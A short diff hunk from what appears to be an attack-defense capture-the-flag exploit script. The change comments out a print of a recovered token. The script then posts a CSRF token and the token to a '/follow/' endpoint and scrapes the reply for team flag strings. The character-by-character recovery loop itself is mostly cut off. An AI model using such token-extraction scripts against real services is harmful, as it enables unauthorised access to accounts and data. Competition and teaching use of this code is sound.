@@ -56,7 +56,7 @@ with requests.Session() as s:
             else:  # If no character was found, stop
                 break
             i += 1
-        print(token)
+        # print(token)
         req = 'csrf_token={}&token={}'.format(csrf[0], token)
         p = s.post('http://{}:5000/follow/{}'.format(ip, user), data = req.encode('UTF-8'), headers = headers)
         posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
